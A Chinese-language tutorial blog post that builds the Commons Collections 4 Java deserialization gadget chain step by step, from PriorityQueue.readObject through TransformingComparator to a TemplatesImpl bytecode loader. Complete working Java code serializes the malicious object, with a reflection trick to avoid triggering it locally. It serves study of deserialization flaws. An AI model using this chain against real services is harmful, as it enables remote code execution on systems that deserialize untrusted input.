---
title: JAVA安全:CC4链
---

*作者：Narcher*	*时间：2024/3/19*	*分类：Vulnerability Analysis*

<!--more-->

## 前言

经过前几条链子的学习积累，CC4的学习可以说是轻松了很多。CC4这条链子和前边的不同之处在于commons-collections由原先的大版本3改成了大版本4，也就是说作用范围不同。

本质上来看，CC4和之前CC3的区别在于更改了前边的触发方式，由AnnotationInvocationHandler的readObject->Proxy->AnnotationInvocationHandler的invoke->LazyMap的get+一系列transform变为了PriorityQueue的readObject->PriorityQueue的heapify->PriorityQueue的siftDown->PriorityQueue的siftDownUsingComparator->TransformingComparator的compare+一系列transform。实际上还是换汤不换药，我们直接进入正文。



## 正文

先来看一下ysoserial中的链子构造：

<img src="JAVA%E5%AE%89%E5%85%A8CC4%E9%93%BE/1710838691307.png" alt="1710838691307" style="zoom: 50%;" />

知道了大致思路，我们就自己来从头写一遍。

### 1.TransformingComparator部分

思路先捋一捋，我们在commons-collections4中，原先的CC3链子在ChainedTransformer之后就断掉了，因此我们要找一个能够触发transform方法的类作为LazyMap的替代，于是便找到了TransformingComparator：

<img src="JAVA%E5%AE%89%E5%85%A8CC4%E9%93%BE/1710839517506.png" alt="1710839517506" style="zoom:67%;" />

可见TransformingComparator的compare方法调用了transform方法，我们接下来只需要确保构造时传入构造好的chainedTransformer就好了，至于compare的参数并不是有用的，因为我们的ConstantTransformer太强了。

之后便是寻找调用compare方法的类，这里CC4作者直接用了内部类。

### 2.PriorityQueue部分

<img src="JAVA%E5%AE%89%E5%85%A8CC4%E9%93%BE/1710839688530.png" alt="1710839688530" style="zoom:67%;" />

可见PriorityQueue的siftDownUsingComparator调用了compare方法，我们再往上找，找到了PriorityQueue的siftDown方法：

<img src="JAVA%E5%AE%89%E5%85%A8CC4%E9%93%BE/1710839784057.png" alt="1710839784057" style="zoom:67%;" />

接着往上找，找到PriorityQueue的heapify方法：

<img src="JAVA%E5%AE%89%E5%85%A8CC4%E9%93%BE/1710839822026.png" alt="1710839822026" style="zoom:67%;" />

再往上找，就找到了PriorityQueue的readObject方法了：

<img src="JAVA%E5%AE%89%E5%85%A8CC4%E9%93%BE/1710839872332.png" alt="1710839872332" style="zoom:67%;" />

实际上，这样子就基本上大功告成了，我们来构造链子。

### 3.构造链

#### 3.1 拼接

至于CC3的后半部分，我就全拿过来了：

```java
TemplatesImpl templates = new TemplatesImpl();
Class tc = templates.getClass();
Field nameField = tc.getDeclaredField("_name");
nameField.setAccessible(true);
nameField.set(templates,"aaaa");
Field bytecodesField = tc.getDeclaredField("_bytecodes");
bytecodesField.setAccessible(true);
byte[] code = Files.readAllBytes(Paths.get("C://Users//Narcher//IdeaProjects//CC3_test.class"));
byte[][] codes = {code};
bytecodesField.set(templates,codes);
Field tfactoryField = tc.getDeclaredField("_tfactory");
tfactoryField.setAccessible(true);
tfactoryField.set(templates, new TransformerFactoryImpl());
// templates.newTransformer();
Transformer[] transformers=new Transformer[]{
        new ConstantTransformer(TrAXFilter.class),
        new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
};
ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);
```

CC3_test.class还是一样的。

剩下的先用TransformingComparator接住chainedTransformer：

```java
TransformingComparator transformingComparator = new TransformingComparator<>(chainedTransformer);
```

再用PriorityQueue接住transformingComparator：

```java
PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
```

嗯，最后序列化和反序列化就应该好了：

```java
TemplatesImpl templates = new TemplatesImpl();
Class tc = templates.getClass();
Field nameField = tc.getDeclaredField("_name");
nameField.setAccessible(true);
nameField.set(templates,"aaaa");
Field bytecodesField = tc.getDeclaredField("_bytecodes");
bytecodesField.setAccessible(true);
byte[] code = Files.readAllBytes(Paths.get("C://Users//Narcher//IdeaProjects//CC3_test.class"));
byte[][] codes = {code};
bytecodesField.set(templates,codes);
Field tfactoryField = tc.getDeclaredField("_tfactory");
tfactoryField.setAccessible(true);
tfactoryField.set(templates, new TransformerFactoryImpl());
// templates.newTransformer();
Transformer[] transformers=new Transformer[]{
        new ConstantTransformer(TrAXFilter.class),
        new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
};
ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);
TransformingComparator transformingComparator = new TransformingComparator<>(chainedTransformer);
PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
//序列化
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("C:\\Users\\Narcher\\IdeaProjects\\CC3.txt"));
oos.writeObject(priorityQueue);
//反序列化
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("C:\\Users\\Narcher\\IdeaProjects\\CC3.txt"));
ois.readObject();
```

#### 3.2 问题

结果无事发生，肯定是中间某一部分出错了，我们就在PriorityQueue的readObject打个断点调试一下看看问题所在：

<img src="JAVA%E5%AE%89%E5%85%A8CC4%E9%93%BE/1710840541721.png" alt="1710840541721" style="zoom:67%;" />

可以看到这个size为0，传入之后不会通过for循环触发接下来的方法，那我们就需要给这个数组加点元素，让它右移一位仍旧大于0，很简单，直接传两个数，让它size为2就行了：

```java
priorityQueue.add(1);
priorityQueue.add(2);
```

结果发现在序列化之前就已经弹出计算器了，说明前边的代码有调用整条链子的方法。实际上这里是add方法，我们进去看一下：

<img src="JAVA%E5%AE%89%E5%85%A8CC4%E9%93%BE/1710841319897.png" alt="1710841319897" style="zoom: 50%;" />

<img src="JAVA%E5%AE%89%E5%85%A8CC4%E9%93%BE/1710841377176.png" alt="1710841377176" style="zoom:67%;" />

<img src="JAVA%E5%AE%89%E5%85%A8CC4%E9%93%BE/1710841414672.png" alt="1710841414672" style="zoom:50%;" />

可见这一套流程下来也会触发compare方法，我们不想让它本地执行也很简单，直接在给transformingComparator赋值的时候随便给一个值，之后在序列化之前给它改回chainedTransformer就好了。

#### 3.3 完工

最终完整链子如下：

```java
TemplatesImpl templates = new TemplatesImpl();
Class tc = templates.getClass();
Field nameField = tc.getDeclaredField("_name");
nameField.setAccessible(true);
nameField.set(templates,"aaaa");
Field bytecodesField = tc.getDeclaredField("_bytecodes");
bytecodesField.setAccessible(true);
byte[] code = Files.readAllBytes(Paths.get("C://Users//Narcher//IdeaProjects//CC3_test.class"));
byte[][] codes = {code};
bytecodesField.set(templates,codes);
Field tfactoryField = tc.getDeclaredField("_tfactory");
tfactoryField.setAccessible(true);
tfactoryField.set(templates, new TransformerFactoryImpl());
// templates.newTransformer();
Transformer[] transformers=new Transformer[]{
        new ConstantTransformer(TrAXFilter.class),
        new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
};
ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);
TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
priorityQueue.add(1);
priorityQueue.add(2);
Class c = transformingComparator.getClass();
Field transformerField = c.getDeclaredField("transformer");
transformerField.setAccessible(true);
transformerField.set(transformingComparator, chainedTransformer);
//序列化
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("C:\\Users\\Narcher\\IdeaProjects\\CC4.txt"));
oos.writeObject(priorityQueue);
//反序列化
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("C:\\Users\\Narcher\\IdeaProjects\\CC4.txt"));
ois.readObject();
```

